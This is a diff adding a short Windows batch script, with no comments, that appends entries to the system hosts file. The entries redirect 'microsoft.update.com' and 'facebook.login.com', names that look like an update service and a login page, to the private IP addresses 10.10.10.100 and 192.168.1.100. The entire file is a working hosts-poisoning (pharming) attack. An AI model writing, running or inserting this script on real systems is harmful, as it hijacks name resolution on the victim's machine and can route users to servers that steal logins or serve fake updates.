@@ -1,0 +1,8 @@
+@echo off
+
+echo 10.10.10.100 	microsoft.update.com >> %WINDIR%\System32\Drivers\Etc\Hosts
+echo 192.168.1.100	microsoft.update.com >> %WINDIR%\System32\Drivers\Etc\Hosts
+echo 10.10.10.100 	facebook.login.com >> %WINDIR%\System32\Drivers\Etc\Hosts
+echo 192.168.1.100	facebook.login.com >> %WINDIR%\System32\Drivers\Etc\Hosts
+
+exit
